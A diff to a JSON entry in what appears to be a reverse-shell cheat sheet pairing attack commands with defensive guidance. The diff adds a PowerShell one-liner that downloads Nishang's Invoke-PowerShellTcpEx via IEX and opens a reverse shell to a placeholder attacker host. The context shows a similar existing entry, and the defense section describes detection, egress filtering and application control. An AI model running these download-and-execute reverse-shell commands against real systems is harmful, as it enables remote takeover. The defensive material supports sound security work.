@@ -74,6 +74,10 @@
     {
       "label": "Windows Nishang Invoke-PowerShellTcp (download + exec)",
       "command": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\""
+    },
+    {
+      "label": "Windows Nishang Invoke-PowerShellTcpEx (AES-encrypted)",
+      "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-PowerShellTcpEx.ps1');Invoke-PowerShellTcpEx -Reverse -IPAddress <lhost> -Port <lport>\""
     }
   ],
   "opsec": "loud",
@@ -84,7 +88,7 @@
   "defense": {
     "why_it_works": "Unix shells (bash, sh, zsh, etc.) are present by default on Linux and macOS and control every aspect of a system. Certain commands require elevated privileges, but interactive shell access provides a powerful execution environment that attackers use for commands, file operations, pivoting, and spawning further processes.",
     "prerequisites": "Code execution on the target and network egress to the attacker's listener.",
-    "impact": "An interactive shell on the attacker's side, initiated outbound from the target — bypassing inbound firewall rules.",
+    "impact": "An interactive shell on the attacker's side, initiated outbound from the target \u2014 bypassing inbound firewall rules.",
     "detection": "Monitor for Unix shell execution from unexpected parent processes (e.g., a web server or database process spawning bash). Flag shell activity following unusual network connections, file writes to web directories, or privilege escalation attempts.",
     "artifacts": "An outbound connection from the target to the listener; a shell interpreter spawned with a network redirect (e.g. bash -i >& /dev/tcp/...) in process logs.",
     "prevention": "Use application control where appropriate to restrict which binaries can execute. On ESXi hosts, the execInstalledOnly feature prevents binaries from running unless packaged and signed as part of a vSphere installation bundle (VIB).",
@@ -92,8 +96,8 @@
     "sources": [
       "MITRE T1059.004"
     ],
-    "misconfiguration": "Outbound connections from servers are not filtered — any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
-    "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows — PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
-    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows — PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+    "misconfiguration": "Outbound connections from servers are not filtered \u2014 any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
+    "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows \u2014 PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
+    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows \u2014 PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
   }
 }
